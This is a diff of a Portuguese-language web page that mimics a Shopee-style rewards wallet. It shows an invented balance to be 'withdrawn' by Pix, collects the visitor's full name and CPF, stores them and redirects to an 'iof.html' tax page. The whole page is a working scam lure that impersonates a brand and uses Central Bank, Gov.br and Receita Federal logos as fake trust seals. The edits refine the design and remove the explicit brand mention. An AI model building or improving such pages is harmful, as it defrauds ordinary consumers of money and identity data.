@@ -9,26 +9,33 @@
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body {
             font-family: 'Roboto', sans-serif;
-            background: linear-gradient(180deg, #ee4d2d 0%, #f5f5f5 35%);
+            background: #f5f5f5; /* Volta para o fundo cinza claro original */
             margin: 0; padding: 0;
             color: #333;
             min-height: 100vh;
         }
 
         /* --- TELA 1: SALDO --- */
-        .header-section { padding: 30px 20px 40px 20px; color: white; position: relative; }
-        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
+        .header-section {
+            background: #ee4d2d; /* Cor laranja sólida original */
+            padding: 20px;
+            color: white;
+            position: relative;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+        }
+        .header-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px; }
         
-        /* Moeda Dourada Realista */
-        .coin-icon { width: 45px; height: 45px; filter: drop-shadow(0 3px 6px rgba(0,0,0,0.2)); }
+        /* Moeda Dourada no canto superior direito */
+        .coin-icon { width: 45px; height: 45px; }
         
+        /* Estilo dos cards planos originais */
         .card-white {
             background: white;
-            margin: 0 15px 15px 15px;
-            padding: 22px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-            position: relative;
+            margin: 15px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
         /* Opções de Valor */
@@ -55,18 +62,17 @@
             border: none; border-radius: 8px;
             font-size: 16px; font-weight: 800;
             cursor: pointer; text-transform: uppercase;
-            box-shadow: 0 4px 10px rgba(238, 77, 45, 0.2);
         }
-        .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; box-shadow: none; }
+        .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; }
 
-        /* Selos de Segurança */
+        /* Área dos Selos de Segurança no rodapé */
         .security-footer {
             display: flex; justify-content: space-around; align-items: center;
-            margin-top: 25px; padding-top: 15px;
-            border-top: 1px solid #f0f0f0;
-            filter: grayscale(100%); opacity: 0.6;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
         }
-        .security-img { height: 28px; width: auto; }
+        .security-img { height: 35px; width: auto; filter: grayscale(100%); opacity: 0.8; }
 
         /* Modal */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: flex; align-items: flex-end; }
@@ -82,17 +88,22 @@
     <div id="step-1">
         <div class="header-section">
             <div class="header-top">
-                <span style="font-size: 14px; font-weight: 500; opacity: 0.9;">Saldo disponível para resgate</span>
+                <div>
+                    <span style="font-size: 14px; font-weight: 500; opacity: 0.9;">Seu saldo</span>
+                    <div style="font-size: 44px; font-weight: 900; letter-spacing: -1px;">R$ <span id="balance">0,00</span></div>
+                    <div style="font-size: 13px; opacity: 0.8; margin-top: 4px;">= <span id="points">0,00</span> pontos (s)</div>
+                </div>
                 <div class="coin-icon">
                     <svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="248" fill="#ffd700" stroke="#daa520" stroke-width="8"/><circle cx="256" cy="256" r="200" fill="none" stroke="#daa520" stroke-width="8" stroke-dasharray="20,10"/><text x="50%" y="65%" text-anchor="middle" fill="#daa520" font-family="Arial" font-weight="bold" font-size="250">$</text></svg>
                 </div>
             </div>
-            <div style="font-size: 44px; font-weight: 900; letter-spacing: -1px;">R$ <span id="balance">0,00</span></div>
-            <div style="font-size: 13px; opacity: 0.8; margin-top: 4px;">= <span id="points">0,00</span> pontos (s)</div>
+            <div style="font-size: 13px; opacity: 0.9; margin-top: 10px; border-top: 1px solid rgba(255,255,255,0.3); padding-top: 10px;">
+                Última bonificação apresentada: R$ 845,24
+            </div>
         </div>
 
-        <div class="card-white" style="margin-top: -25px; z-index: 10;">
-            <h3 style="margin: 0 0 15px 0; font-size: 17px;">Sacar agora</h3>
+        <div class="card-white">
+            <h3 style="margin: 0 0 15px 0; font-size: 17px;">Sacar dinheiro</h3>
             
             <div style="display:flex; align-items:center; gap:8px; margin-bottom:15px; font-size:14px; color:#555;">
                 <span style="font-size: 18px;">💳</span> Transferência via <strong style="color:#2c9e94;">Pix</strong>
@@ -111,11 +122,17 @@
             <button id="btn-sacar" class="btn-main btn-disabled" onclick="openModal()">
                 SACAR DINHEIRO
             </button>
+            <p style="font-size:12px; color:#999; text-align:center; margin-top:15px; line-height:1.5;">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5.</p>
+        </div>
 
+        <div class="card-white">
+            <h3 style="margin: 0 0 10px 0; font-size: 16px;">Obtenha seu acesso exclusivo</h3>
+            <p style="font-size:13px; color:#666; line-height:1.5; margin-bottom: 20px;">Descubra todos os benefícios liberados especialmente para você.</p>
+            
             <div class="security-footer">
                 <img src="https://logodownload.org/wp-content/uploads/2017/08/bacen-logo.png" class="security-img" alt="Bacen">
-                <img src="https://www.gov.br/++theme++br.gov.tema/images/logo-govbr.png" class="security-img" alt="Gov.br">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg/1024px-Receita_Federal_do_Brasil_-_2022_logo.svg.png" class="security-img" alt="Receita">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="security-img" alt="Gov.br">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="security-img" alt="Receita Federal">
             </div>
         </div>
     </div>
@@ -126,7 +143,7 @@
             <input type="text" id="nome" placeholder="Nome completo do titular">
             <input type="tel" id="cpf" placeholder="CPF (Apenas números)" maxlength="14">
             <button class="btn-main" onclick="irParaTaxa()">CONFIRMAR E CONTINUAR</button>
-            <p style="text-align:center; font-size:11px; color:#aaa; margin-top:20px;">🔒 Transação criptografada Shopee Pay</p>
+            <p style="text-align:center; font-size:11px; color:#aaa; margin-top:20px;">🔒 Transação criptografada</p>
         </div>
     </div>
 
@@ -150,11 +167,11 @@
         }
 
         window.onload = () => {
-            animateNumber('balance', 1489.38, 1200); // Carrega em 1.2s
-            animateNumber('points', 42583.05, 1200);
+            animateNumber('balance', 1489.38, 1500); // Carrega em 1.5s
+            animateNumber('points', 42583.05, 1500);
         };
 
-        // --- 2. LOGICA SELEÇÃO ---
+        // --- 2. LÓGICA DE SELEÇÃO ---
         let selecionado = false;
         function selectOpt(el) {
             document.querySelectorAll('.option-btn, .big-option').forEach(b => b.classList.remove('selected'));
@@ -169,12 +186,11 @@
         function ativarBotao() {
             const btn = document.getElementById('btn-sacar');
             btn.classList.remove('btn-disabled');
-            btn.innerText = "SACAR AGORA";
             selecionado = true;
         }
 
         function openModal() {
-            if(!selecionado) return alert("Selecione um valor.");
+            if(!selecionado) return alert("Selecione um valor para sacar.");
             document.getElementById('modal-pix').classList.remove('hidden');
         }
 
@@ -190,11 +206,10 @@
             const cpf = document.getElementById('cpf').value;
             if(nome.length < 5 || cpf.length < 14) return alert("Preencha os dados corretamente.");
             
-            // Salva os dados para usar na proxima pagina (IOF)
             localStorage.setItem('user_nome', nome);
             localStorage.setItem('user_cpf', cpf);
             
-            window.location.href = 'iof.html'; // Vai para a página da Receita
+            window.location.href = 'iof.html';
         }
     </script>
 </body>
